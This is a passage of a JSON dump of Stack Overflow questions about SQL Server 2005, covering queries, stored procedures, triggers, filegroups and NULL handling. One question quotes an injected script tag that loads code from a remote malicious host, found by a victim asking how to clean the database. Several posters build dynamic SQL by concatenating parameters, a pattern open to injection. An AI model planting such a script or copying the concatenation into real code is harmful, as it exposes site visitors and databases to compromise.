tsh.TotalNrShare, tsh.CountryCode, tsh.Country\nFROM  dbo.MyView AS tsh INNER JOIN\n                   (SELECT DISTINCT ECode, MAX(TotalNrShare) AS MaxTotalSH\n                    FROM   dbo.MyView\n                    GROUP BY ECode) AS groupedtsh ON tsh.ECode = groupedtsh.ECode AND tsh.TotalNrShare = groupedtsh.MaxTotalSH\n</code></pre>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1399,"score":2,"question_id":663124,"title":"What is the SQL Server CLR Integration Life Cycle?","body":"<p>How are CLR (.NET) objects managed in SQL Server? </p>\n\n<p>The entry point to any CLR code from SQL Server is a static method. Typically you'll only create objects that exist within the scope of that method. However, you could conceivably store references to objects in static members, letting them escape the method call scope. If SQL Server retains these objects in memory across multiple stored procedure/function calls, then they could be useful for caching applications -- although they'd be more dangerous too.</p>\n\n<p>How does SQL Server treat this? Does it even allow (non-method) static members? If so, how long does it retain them in memory? Does it garbage collect everything after every CLR call? How does it handle concurrency?</p>\n"},{"tags":["sql-server","database","sql-server-2005","autoincrement"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":7348,"score":2,"question_id":958120,"title":"How can I make a primary key as AUTOINCREMENT","body":"<p>I have table in Database and the primry key is 'ID', Just I want to ask how can I make it AUTOINCREMENT</p>\n\n<p>I know that's esay Q, but I dont know how can I do it.</p>\n\n<p>thanks</p>\n"},{"tags":["sql-server","sql-server-2005","sql-injection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":238,"score":0,"question_id":11748600,"title":"SQL Injection in my database","body":"<p>Is it possible to write a query that goes through the entire database to search out a particular phrase to delete it, instead of going table by table? This is on a SQL Server 2008 Database that was injected. The following appears throughout the database tables:</p>\n\n<pre><code>\"&gt;&lt;/title&gt;&lt;script src=\"http://lasimp04risoned.rr.nu/sl.php\"&gt;&lt;/script&gt;&lt;!--\n</code></pre>\n\n<p>This appears all over in different tables exactly as above. So my database is currently limping. Can anyone help me?</p>\n\n<p>Thanks</p>\n\n<p>Daniel</p>\n"},{"tags":["query","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":11943597,"title":"Unclosed quotation","body":"<p>I am trying to pull the selected values from my checkboxlist but I keep running into an error in sql.</p>\n\n<p>error</p>\n\n<pre><code>Msg 105, Level 15, State 1, Line 22\nUnclosed quotation mark after the character string ')'.\nMsg 102, Level 15, State 1, Line 22\nIncorrect syntax near ')'.\n</code></pre>\n\n<p>SP</p>\n\n<pre><code>@DEPTCODE INT,\n@COA VARCHAR(50),\n@MAP VARCHAR(10)\nAS\nBEGIN\nSET NOCOUNT ON;\nDECLARE @SQL VARCHAR(MAX);\n\nBEGIN\nSET @SQL = N'SELECT \n              A.GL_EXCEPT_ID AS ''GL ID''\n            , A.COA_SYSTEM AS ''Account Type''\n            , A.ENTN AS ''Entity''\n            , A.MED_CTR AS ''Medical Center''\n            , (''['' + A.LOCN + ''] '' + B.LOCN_DESC) AS ''Location Code''\n            , (''['' + A.CTRN + ''] '' + C.CTRN_DESC) AS ''Cost Center''\n            , (''['' + RTRIM(A.FUND) + ''] '' + A.FUND_DESC) AS ''Fund''\n            , A.ROLLUP_TYPE_ID AS ''Rollup ID''\n            , A.ROLLUP_TYPE_DESC AS ''Rollup Type''\n            , A.MAPPING AS ''Mapping''\nFROM V_ROLLUP_GL_DESC_REV1 A\n    LEFT JOIN T_ROLLUP_GL_LOCN B\n        ON A.LOCN = B.LOCN\n            AND A.MED_CTR_ID = B.MED_CTR_ID\n            AND A.COA_SYSTEM = B.COA_SYSTEM\n    LEFT JOIN T_ROLLUP_GL_CTRN C\n        ON A.CTRN = C.CTRN\n            AND A.COA_SYSTEM = C.COA_SYSTEM\nWHERE (A.DEPT_ID = '+CONVERT(VARCHAR,@DEPTCODE)+')\n        AND A.COA_SYSTEM IN ('+@COA+')\n        AND A.MAPPING IN ('+@MAP+''')'\nPRINT(@SQL)\nEXEC(@SQL)\nEND\nEND\n</code></pre>\n\n<p>Query</p>\n\n<pre><code>USE [Rollup2]\nGO\n\nDECLARE @return_value int\n\nEXEC    @return_value = [dbo].[USP_GET_GL_BY_DEPT]\n    @DEPTCODE = 1000,\n    @COA = N'''COA'',''COA_SYSTEM''',\n    @MAP = N'''DEFAULT'',''EXCEPTION'''\n\nSELECT  'Return Value' = @return_value\n</code></pre>\n"},{"tags":["sql","sql-server-2005","query"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":5353516,"title":"SQL Server - update on-the-fly added column","body":"<p>I used the following command to add a new column initialized with \"100\" to the result of SELECT </p>\n\n<pre><code>select id, 100 as newcol from table\n</code></pre>\n\n<p>How to update newcol values? for example I want to set newcol = 200 where id = 1</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":196,"score":2,"question_id":5728031,"title":"SQL Server 2005 Single Quoted list of strings fail","body":"<p>I have an SP that has an <code>nvarchar(max)</code> parameter <code>@p1</code>. This is a comma separated list of codes e.g. <code>100,200,300</code> etc</p>\n\n<p>Inside the SP I declare a variable <code>@p2 nvarchar(max)</code> and convert the <code>@p1</code> list into a single quoted list</p>\n\n<pre><code>set @p2 = N'''' + replace(@p1,',',''',''') + ''''\n</code></pre>\n\n<p>When I \"select\" <code>@p2</code> this returns the correct <code>'100', '200', '300'</code></p>\n\n<p>If I then use <code>@p2</code> in a subselect, e.g</p>\n\n<pre><code>select x,y,z from table1 where id in (@p2) \n</code></pre>\n\n<p>I get no rows returned? If I modify the same SQL to use the same string literal I got from the previous select I get the rows ok? </p>\n\n<p>How can I pass a string containing a list of single quoted identifiers to a SP and use this in a subselect? I've Googled this extensively, and it is possible to convert the list to a temporary table inside the SP and use this, but I need to use the quoted list so I can use an OPTIMIZE FOR query hint.</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":11940034,"title":"Conversion Failing","body":"<p>I currently have an update statement running in c# and the front end to edit some values in my sql server database.  But I am getting a Conversion Failed error.  I can not seem to find the source.</p>\n\n<p>ERROR message</p>\n\n<pre><code>Conversion failed when converting the nvarchar value 'UPDATE T_ROLLUP_SYSTEM_EXCEPT\n            SET DEPT_ID = ' to data type int.\n14\n</code></pre>\n\n<p>Sql</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[USP_UPDATE_SYS_MAPPING]\n-- Add the parameters for the stored procedure here\n@SYSTEM VARCHAR(50),\n@UNIT VARCHAR(50),\n@MEDCTRLEVEL VARCHAR(50),\n@MEDCTR VARCHAR(50),\n@FACID VARCHAR(50),\n@ENTN VARCHAR(50),\n@DEPT_ID INT,\n@ROLLUP_TYPE_ID INT\nAS\nBEGIN\n-- SET NOCOUNT ON added to prevent extra result sets from\n-- interfering with SELECT statements.\nSET NOCOUNT ON;\nDECLARE @SQL VARCHAR(MAX);\nDECLARE @MEDCTRID INT;\n\nSELECT @MEDCTRID = MED_CTR_ID FROM T_ROLLUP_MED_CTR WHERE MED_CTR = @MEDCTR\nPRINT (@MEDCTRID);\n\n-- Insert statements for procedure here\nSET @SQL = N'UPDATE T_ROLLUP_SYSTEM_EXCEPT\n            SET DEPT_ID = \n                '''+@DEPT_ID'''                 , ROLLUP_TYPE_ID = '''+@ROLLUP_TYPE_ID+'''\n                , UPDATE_DT = GETDATE()\n            WHERE SYSTEM = '''+@SYSTEM+'''\n                AND ENTN = '''+@ENTN+'''\n                AND MED_CTR_ID = '+CONVERT(VARCHAR,@MEDCTRID)+'\n                AND MED_CTR_LEVEL = '''+@MEDCTRLEVEL+'''\n                AND FAC_ID = '''+@FACID+'''\n                AND UNIT = '''+@UNIT+''''\nPRINT (@SQL);\nEXEC (@SQL);\n</code></pre>\n\n<p>HTML</p>\n\n<pre><code>            string[] mdctrvalue = medctr.Text.Split('[', ']');\n            string[] mpvalue = mpSearch.Text.Split('(', ')');\n\n            string sys = acctsys.ToString();\n            string unit = txtunit.ToString();\n            string mdctrlvl = mdctrvalue[1].ToString();\n            string mdctr = mdctrvalue[0].ToString();\n            string facid = fac.ToString();\n            string entn = txtentn.ToString();\n            string dept_id = dept.SelectedValue.ToString();\n            string rollup_type_id = rolluptype.SelectedValue.ToString();\n\n            SqlConnection myconn = new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings[\"Rollup2ConnectionString\"].ConnectionString);\n            SqlCommand cmd = new SqlCommand();\n            cmd.Connection = myconn;\n            cmd.CommandType = CommandType.StoredProcedure;\n            cmd.CommandText = \"USP_UPDATE_SYS_MAPPING\";\n            cmd.Parameters.Add(\"@SYSTEM\", SqlDbType.VarChar).Value = acctsys.ToString();\n            cmd.Parameters.Add(\"@UNIT\", SqlDbType.VarChar).Value = unit.ToString();\n            cmd.Parameters.Add(\"@MEDCTRLEVEL\", SqlDbType.VarChar).Value = mdctrlvl.ToString();\n            cmd.Parameters.Add(\"@MEDCTR\", SqlDbType.VarChar).Value = mdctr.ToString();\n            cmd.Parameters.Add(\"@FACID\", SqlDbType.VarChar).Value = facid.ToString();\n            cmd.Parameters.Add(\"@ENTN\", SqlDbType.VarChar).Value = entn.ToString();\n            cmd.Parameters.Add(\"@DEPT_ID\", SqlDbType.Int).Value = dept_id.ToString();\n            cmd.Parameters.Add(\"@ROLLUP_TYPE_ID\", SqlDbType.Int).Value = rollup_type_id.ToString();\n\n            myconn.Open();\n            int retVal = cmd.ExecuteNonQuery();\n</code></pre>\n"},{"tags":["sql","vb.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":114,"score":-4,"question_id":11935847,"title":"convert marks into percentage","body":"<p>how to convert marks obtained by a student into x% \ni.e. there are two exams. calculate certain %marks from both exams (say x% and Y%) so that the total will be 100%</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":11882039,"title":"combining resultset of many select queries","body":"<p>I have four Select queries for four different tables, each extracting only one record. For example:</p>\n\n<pre><code>Select * from table where col1 = 'something'\n</code></pre>\n\n<p>gives one row having 3 columns.</p>\n\n<p>The second select query also gives one record having two columns(fields). Same for third and fourth select query.</p>\n\n<p>I want to combine all four result sets into one having one row. How is it possible?</p>\n\n<p>I will write the queries for you.</p>\n\n<p>1st one:</p>\n\n<pre><code>Select Top 1 column1, column2\nfrom table 1\nwhere column 1 = 'something'\n  and col1 = (Select max(col1) where column 1 = 'something')\n</code></pre>\n\n<p>2nd query:</p>\n\n<pre><code>Select Top 1 column1, column3\nfrom table 2\nwhere column 1 = 'something'\n  and column3 = (Select max(column3) where column 1 = 'something')   \n</code></pre>\n\n<p>3rd query uses the result obtained from query 2:</p>\n\n<pre><code>Select column4\nfrom table 3\nwhere column3 = (obtained from 2nd query)  (there is only one row)\n</code></pre>\n\n<p>4th:</p>\n\n<pre><code>Select column5\nfrom table 4\nwhere column3 = (obtained from 2nd query) (there is only one row)\n</code></pre>\n\n<p>This means I have to join 2nd, 3rd, 4th query, then resulting set in 1st.</p>\n\n<p>I can't use union since columns are different.</p>\n\n<p>So only problem is with joining the result set.</p>\n"},{"tags":["delphi","sql-server-2005","sql-server-2000","tadodataset"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":174,"score":2,"question_id":11913549,"title":"How to detect any modification that happens in SQL Server database?","body":"<p>I have an application using <code>TADODataSet</code> and <code>TADOConnection</code> to connect with SQL Server database.</p>\n\n<p>I would like to detect any modification that happens in the database. </p>\n\n<p>modifications = Insert, Update, Delete</p>\n\n<p>I want to know which <code>TADODataset</code> or which table has been modified.</p>\n\n<p>I'm doing this because I have a multi-user application that works over local network. The users may add, delete or edit records in tables so I want to refresh the datasets to show the new modifications.</p>\n\n<p>Also I want this to build a log.</p>\n\n<p>I don't want to use <code>TTime</code> to keep watching the modifications.<br>\nI don't want to use triggers</p>\n\n<p>I prefer a message from <code>TADOConnection</code>.</p>\n\n<p>I'm using SQL Server 2005 and Delphi 2007 with ADO components.</p>\n\n<p>New modification : I need it on SQL Server 2000</p>\n\n<p>Regards.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":11901353,"title":"How to include empty string in a like query in sql server","body":"<p>This seems an easy thing but somehow I'm not able to think of it.</p>\n\n<p>I want to write a like query in this format:</p>\n\n<pre><code>WHERE Searchfield LIKE '[ ;]Mark'\n</code></pre>\n\n<p>Now this would check for an occurence of</p>\n\n<pre><code>' Mark', ';Mark'\n</code></pre>\n\n<p>I want it to be able to search the following string as well:</p>\n\n<pre><code>'Mark'\n</code></pre>\n\n<p>How do I indicate that it can have the occurrence of a space, or a semicolon or no character.</p>\n"},{"tags":["sql","sql-server-2005","sp-send-dbmail"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":9996605,"title":"Streaming htm file with an image into sp_send_dbmail","body":"<p>I have a stored procedure the runs sp_makewebtask to create a .HTM file.  Thie file consists of an image and the output of a query along with some addtional verbage. What I would like to do is to send out that .HTM file using sp_send_dbmail. I know I can bypass the sp_makewebtask step and dynamically create the .HTM file but I am hoping to avoid this. Any ideas? Thanks </p>\n\n<p>EXEC msdb.dbo.sp_send_dbmail @recipients='John.Testing@companyX.COM',<br>\n    @subject = 'My Mail Test',<br>\n    @body = @Var1, --Basically I want to know how I can replace the @Var1 with the dynamically created .HTM file<br>\n    @body_format = 'HTML'     </p>\n"},{"tags":["c#",".net","windows","sql-server-2005","deployment"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":286,"score":0,"question_id":11913195,"title":"Setup of C# 3.5 window application with database SQL Server 2005","body":"<p>As I am very new in this technology, and I have made a windows application in C# .NET 3.5 with SQL Server 2005. I also made the setup from Visual Studio 2008 wizard, but I cannot configure the server name (such as Amit/SQLEXPRESS). Is there any way to make the setup that automatically configure the server name when I install the setup onto client system?</p>\n\n<p>Please send me the step by step process.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":316,"score":0,"question_id":7376480,"title":"How to insert or update a dbf file in a SQL Server 2005 trigger?","body":"<p>I would like to insert or update a dbf file inside a after insert, update, delete trigger of SQL Server 2005.</p>\n\n<p>I have come up with this</p>\n\n<pre><code>INSERT INTO openrowset('MSDASQL','Driver={Microsoft Visual FoxPro Driver};SourceDB=C:\\DBASE;SourceType=DBF','select * from persons')\nSELECT 'coke','zero',4004\n</code></pre>\n\n<p>it works fine when I'm running it in SQL Server Management Studio or when I compile the trigger\nbut when I use our front end .NET program to update data an message box pops up saying</p>\n\n<blockquote>\n  <p>The operation could not be performed because OLE DB provider \"MSDASQL\"\n  for linked server \"(null)\"</p>\n</blockquote>\n\n<p>help pls? thanks!</p>\n"},{"tags":["sql-server-2005","pivot"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":11903912,"title":"Combining columns with no common element (pivot) in SQL Server","body":"<p>I am trying to find the best way to display some data.</p>\n\n<p>My dataset looks like this:</p>\n\n<pre><code>Form  var1_Day  var1_WTD  var1_30Day  var2_Day  var2_WTD  var2_30Day ...\nNA    null      null      null        77        448       2581\nA1    166       791       4842        null      null      null\nA2    304       1312      8365        null      null      null\nA3    29        113       656         null      null      null\n</code></pre>\n\n<p>I am trying to figure out how I would go about displaying the data like this:</p>\n\n<pre><code>Var   Form  Day   WTD   30Day\nvar1  NA    null  null  null\nvar1  A1    166   791   4842\nvar1  A2    304   1312  8365\nvar1  A3    29    113   656\nvar2  NA    77    448   2581\nvar2  A1    null  null  null\nvar2  A2    null  null  null\nvar2  A3    null  null  null\n...\n</code></pre>\n\n<p>I believe I will have to use a pivot table but am not sure where to start.</p>\n\n<p>Thank You,\nBrad</p>\n"},{"tags":["sql-server-2005","reporting-services"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":11904658,"title":"Displaying the records that are logged not on random time intervals, every one hour to make a report using ssrs","body":"<p>First of all I am new user for SQL Server</p>\n\n<p>Required from SQL: creating a daily report in the form of a matrix that consists of 24 rows representing the 24 hours of the day and the columns represent  measurements coming out of different sensors .</p>\n\n<p>The problem is not on how to create the report, but in the sql table used to build it. as this table is not logged on hourly basis but on exception basis which means if the sensor's measured value is changed over a 10 % it will be logged otherwise it will not. a lot of time many sensors have their values not changing above 10% for many hours which mean that no corresponding logs will be available in the sql table for these sensors at this hours. how can i fill these data in the report during hours that was not logged. also there are some sensors that are varying so much which is logged every 2 or 3 minutes how can i select only the value at the end of each hour (i.e: 5:00, 6:00,7:00) while the available logs for these sensors are like (5.6 @ 5:04 , 6.3 @ 5:07 , ............., 4.2 @ 6:40 ,5.3 @ 6:45)</p>\n\n<p>sorry for my poor English </p>\n\n<p>please help me as i need it urgently\nthanks in advance</p>\n"},{"tags":["sql","sql-server","security","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":907,"score":1,"question_id":7127602,"title":"Restrict SQL Server Connection to Specific IP Address","body":"<p>I want to restrict the connections to my SQL Server instance to specific IP addresses. I want to prevent any connections from any IP addresses except specific list. Is this something that can be configured in SQL Server instance or database?</p>\n"},{"tags":["internet-explorer","sql-server-2005","ssrs-reports"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":250,"score":0,"question_id":11899479,"title":"Internet Explorer Cannot display the webpage SQL Server Reporting Services","body":"<p>I've been looking at this problem now for sometime now and I can not work it through.</p>\n\n<p>I recently made a change to Report and uploaded it via the Reports home webpage. The report runs fine and is created successfully for me.</p>\n\n<p>However, when a user tries to open the report (by selecting it from a drop down list from our website) they are met with a \"Internet Explorer cannot display the webpage\" page.</p>\n\n<p>This is odd because they can load other reports on the Test system, and they can view the same report on Production. However, they seem to be unable to load reports from a single subfolder of all the reports. All folders of reports have the same secuirty rights though.</p>\n\n<p>I've been over all the log files (that I can find) and there is nothing.</p>\n\n<p>In the Report Services trace log files there is no mention of this error or attempt, only details of how I successfully loaded the report.</p>\n\n<p>There are no errors in the Windows Application/System/Security log files.</p>\n\n<p>There are no records of the attempt for the Http logfiles on the report server.\nFrom the website Http logfiles, there are logs of successful attempts to contact the webpage for the report, but once it is passed to the Reports Site, the trail just dies for the user. (Not so for my attempts.)</p>\n\n<p>All the logfiles do have the correct logs for my successful attempts.</p>\n\n<p>If this was a security issue, would there be something in the logs to say \"access denied\"? Is it possible it's a secuirty issue even though the user can view other reports on test without a hitch?</p>\n\n<p>I have reveresed out the changes in the .rdl file and the report still does not load for them so it is not the reports themselves that are causing the issue. (They do load fine for me!)</p>\n\n<p>I can't think of what else to do. The user unfortunately cannot uncheck the \"friendly error messages\" or lower is IE settings as he does not have control (and is unwilling it seek it.)</p>\n\n<p>Has anyone else experienced this issue?</p>\n\n<p>I am using SQL Server 2005</p>\n\n<p>Please let me know if you would like any further information</p>\n\n<p>Thanks for your help!</p>\n\n<p>Ross</p>\n"},{"tags":["asp.net","visual-studio-2010","sql-server-2005","c#-2.0","login-control"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2257,"score":0,"question_id":8992989,"title":"How to connect a Visual Studio 2010 website to SQL Server 2005","body":"<p>I need to connect Visual Studio 2010 website to SQL Server 2005. My web site is ASP.NET using C#,\non the .NET Framework 2.0</p>\n\n<p>I googled it for hours and every site i entered the information didn't seemed relevant.</p>\n\n<p>Maybe I just don't understand. </p>\n\n<p>I would appreciate if someone showed me from where to begin.</p>\n\n<p>For example: I created a login form using login control from the toolbox but don't know how to continue from here, how do I get the password and username from the database?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":260,"score":2,"question_id":11883237,"title":"INSERT or UPDATE table from another table with composite primary key","body":"<p>I am looking for the correct syntax and way to do the following directly from SQL: insert or update (if data already exists inside) <code>TableMain</code> from data contained in <code>TableA</code> with both having same composite primary key.</p>\n\n<p>Both tables are defined as :</p>\n\n<pre><code>CREATE TABLE TableA (\n[TID0] [int] NOT NULL,\n[TID1] [int] NOT NULL,\n[language] [nvarchar](2) NOT NULL,\n[TID2] [nvarchar](200) NOT NULL,\n[text] [nvarchar](max) NULL,\n[updatedOn] [datetime] NOT NULL  DEFAULT (getdate())\nPRIMARY KEY (\n    [TID0],\n    [TID1],\n    [language],\n    [TID2],\n)\n) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY]\n</code></pre>\n\n<p><code>TableA</code> will be periodically deleted and filled.</p>\n\n<p><code>TableMain</code> as the same definition but will contain many more rows of data and what I need is to insert never seen values from <code>TableA</code> into <code>TableMain</code>, and update already existing rows.</p>\n\n<p>I used to do this kind of insert but I do not know how to handle update and composite primary keys :</p>\n\n<pre><code>INSERT INTO TableMain \n    SELECT * FROM TableA\n</code></pre>\n\n<p>EDIT : i am using <strong>SQL Server 9.00.5000</strong></p>\n\n<p>EDIT : another way inspired by MERGE and <a href=\"http://sqlserver-tips.blogspot.fr/2006/09/mimicking-merge-statement-in-sql.html\" rel=\"nofollow\">mimick it</a></p>\n\n<pre><code>DECLARE @updatedIDs TABLE(\n    [TID0] [int],\n    [TID1] [int],\n    [language] [nvarchar](2),\n    [TID2] [nvarchar](200),\n                PRIMARY KEY ([TID0], [TID1], [language], [TID2])  -- as stated by Nikola Markovinovi above, thanks\n);\n\n-- First update records \nupdate TableMain \n   set [text]      = source.[text], \n       [updatedOn] = source.[updatedOn] \n       OUTPUT\n         inserted.[TID0]\n         inserted.[TID1]\n         inserted.[language]\n         inserted.[TID2]\n       INTO @updatedIDs\n  from \n       TableMain AS main\n       , TableA AS source \n  WHERE    \n   TableMain.[TID0]         = source.[TID0] \n   and TableMain.[TID1]     = source.[TID1] \n   and TableMain.[language] = source.[language] \n   and TableMain.[TID2]     = source.[TID2] \n\n-- And then insert \n\ninsert into TableMain\nselect *\n  from TableA AS source \n where not exists \n       ( \n      select 1\n        from @updatedIDs AS i\n       where i.[TID0]     = source.[TID0] \n         and i.[TID1]     = source.[TID1] \n         and i.[language] = source.[language] \n         and i.[TID2]     = source.[TID2] \n       )\n</code></pre>\n"},{"tags":["asp.net","sql-server-2005","google-maps"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":149,"score":0,"question_id":11896068,"title":"Google map for asp.net","body":"<p>I have  sql server table,in which one column is Latitude and other column is longitude.I have 950 rows in this table.Now i want to add Google map marker point for all this 950 rows.so totally 950 points.I am using Google map control for ASP.Net for doing this task.For adding a single point in a map, following are the code.</p>\n\n<pre><code>GooglePoint GP = new GooglePoint();\nGP.Latitude = 43.65669;\nGP.Longitude = -79.43270;\nGoogleMapForASPNet1.GoogleMapObject.Points.Add(GP);\n</code></pre>\n\n<p>Now i want to take this lat and long from my sql server table.so that it should add itself all the points in the map.Please help me how to do this.Any example code??\nNow i have tried with this code.But i didn't get the point.</p>\n\n<pre><code>protected void Page_Load(object sender, EventArgs e)\n    {\n        GoogleMapForASPNet1.GoogleMapObject.Width = \"1000px\";\n        GoogleMapForASPNet1.GoogleMapObject.Height = \"800px\";\n        GoogleMapForASPNet1.GoogleMapObject.MapType = \"Hybrid\";\n\n        SqlConnection con = new SqlConnection();\n        con.ConnectionString = \"Data Source=GEOFINY5;Initial Catalog=sample;Integrated Security=True\";\n        try\n        {\n            SqlCommand cmd = new SqlCommand(\"Select lat,long from map\",con);\n            con.Open();\n            SqlDataReader dr = cmd.ExecuteReader();\n            //int i = 0;\n            while (dr.Read())\n            {\n                GooglePoint gp = new GooglePoint();\n                //gp.ID = i.ToString;\n                gp.Latitude = Convert.ToDouble(dr.GetValue(1));\n                gp.Longitude = Convert.ToDouble(dr.GetValue(2));\n                gp.InfoHTML = \"Hello!!\";\n                GoogleMapForASPNet1.GoogleMapObject.Points.Add(gp);\n            }\n            con.Close();\n\n        }\n        catch(Exception ex)\n        {\n\n        }\n\n    }\n</code></pre>\n\n<p>Note:\n     I have used Google Map JavaScript API V3 with fusion tables already.But now i would prefer doing with sql server rather than fusion tables.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","database-design","filegroup"],"answer_count":5,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":7302,"score":9,"question_id":544898,"title":"SQL Server 2005 / 2008 - multiple filegroups?","body":"<p>I'm a developer at heart - but every now and then, a customer doesn't have a decent DBA to deal with these issues, so I'm called in to decide....</p>\n\n<p>What are your strategies / best practices when it comes to dealing with a reasonably sized SQL Server database (anything larger than Northwind or AdventureWorks) - do you use multiple filegroups? If so: how many? And why?</p>\n\n<p>What are your criteria to decide when to move away from the \"one filegroup for everything\" approach:</p>\n\n<ul>\n<li>database size?</li>\n<li>database complexity?</li>\n<li>availability / reliability requirements?</li>\n<li>what else?</li>\n</ul>\n\n<p>If you use multiple file groups, how many do you use? One for data, one for index, one for log? Several (how many) for data? What are your reasons for your choice - <em>why</em> do you use that exact number of filegroups :-) </p>\n"},{"tags":["sql-server-2005","filegroup"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":176,"score":0,"question_id":6163649,"title":"Tables in 2 filegroups sql server","body":"<p>My predecessor for some reason split the data between two filegroups in our SQL Server 2005 database.</p>\n\n<p>I'm thinking about just putting everything in one.</p>\n\n<p>Any speculation on why someone would split things between filegroups with two files on the same server?</p>\n\n<p>How do I put all of the objects in a single group?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":11786568,"title":"Creating a update status trigger in SQL Server 2005","body":"<p>I have 2 tables like so:</p>\n\n<p><strong>JOBS</strong> table</p>\n\n<pre><code>Jobcode    UserId    Status\n101        130       R\n102        139       D\n</code></pre>\n\n<p><strong>USERS</strong> table</p>\n\n<pre><code>UserId    Email\n130       test@example.com\n</code></pre>\n\n<p>I want to create a trigger on insert and update that sends an email to my stored procedure:</p>\n\n<pre><code>EXEC dbo.SendMyEmail @email, @jobcode;\n</code></pre>\n\n<p>when the jobcode is inserted as 'D' or updated to 'D'.</p>\n"},{"tags":[".net","asp.net","sql-server","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":230,"score":1,"question_id":3710458,"title":"Issue when running SQL Server 2005 SSIS Package on Remote Server","body":"<p>i created a SSIS package on my development machine which simply:\n1) Deletes records from weak table in database.\n2) Loads file from filesystem into weak table in database.\n3) The package is called from an asp.net page</p>\n\n<p>When i run the package manually on my machine it works, when the protection level is EncryptSensitiveWithUserKey. When i deploy i change the protection level to 'DontSaveSensitive'.</p>\n\n<p>When i run the web application , i get this error - \n<strong>\"An OLE DB error has occurred. Error code: 0x80040E4D. An OLE DB record is available. Source: \"Microsoft SQL Native Client\".</strong></p>\n\n<p>Unfortunately i don't have much access to the SQL Server 2005 instance on the remote server to run it manually.</p>\n\n<p>When i deploy the package, i include an xml config file and include the password in the connectionstring property.</p>\n\n<p>Also i've turned on logging, but cannot see anything written to Event Log or SQL Server.\nCan someone pls refer me to log table that SSIS writes to? I've checked in MSDB. Is it sysdtslog90?</p>\n\n<p>Can someone please give me some pointers to what i can use to troubleshoot this.</p>\n\n<p>Regards</p>\n"},{"tags":[".net","sql-server","sql-server-2005","tsql","rounding"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":3797,"score":4,"question_id":3509891,"title":"Get only two decimal points in money datatype in SQL Server","body":"<pre><code>SELECT ROUND(123.4567, 2)` gives me `123.4600`\n</code></pre>\n\n<p>But I need <code>123.46</code>.</p>\n\n<p>Data type of field is money.</p>\n\n<p><strong>Solution:</strong></p>\n\n<pre><code>&lt;%# DataBinder.Eval(Container.DataItem, \"FieldName\",\"{0:0.00}\") %&gt;\n</code></pre>\n"},{"tags":["tsql","sql-server-2005","null","concatenation"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":11882920,"title":"Threats / drawbacks behind ISNULL(), NULLIF(), and COALESCE()","body":"<p>I am working on a Microsoft SQL Server 2005 with Transact-SQL.</p>\n\n<p>I am trying to concatenate string values coming from different columns of the same table dealing with NULL values.</p>\n\n<p>Say for example the table is <code>Person</code> and the columns are <code>FirstName</code>, <code>SurnamePrefix</code>, <code>LegalSurname</code></p>\n\n<p>It happened that concatenating a string value with a NULL value (coming from two different columns) returns in output a NULL value.\nI tried different scenarios to prevent NULL values in output:</p>\n\n<ul>\n<li>Starting from: \n<ul>\n<li><code>Person.FirstName + ' ' + COALESCE(RTRIM(LTRIM(Person.SurnamePrefix)) + ' ', '') + Person.LegalSurname</code></li>\n</ul></li>\n<li>I changed my statement to:\n<ul>\n<li><code>COALESCE(Person.FirstName + ' ', '') + COALESCE(Person.SurnamePrefix, '') + COALESCE(' ' + Person.LegalSurname, '')</code></li>\n</ul></li>\n</ul>\n\n<p>Then I came across functions like <code>ISNULL()</code>, <code>NULLIF()</code> etc.</p>\n\n<p>Which is the best and efficient approach to show empty strings values in output rather than NULL values?\nIs the solution affected by the version of the SQL Server? (i.e. 2005, 2008, 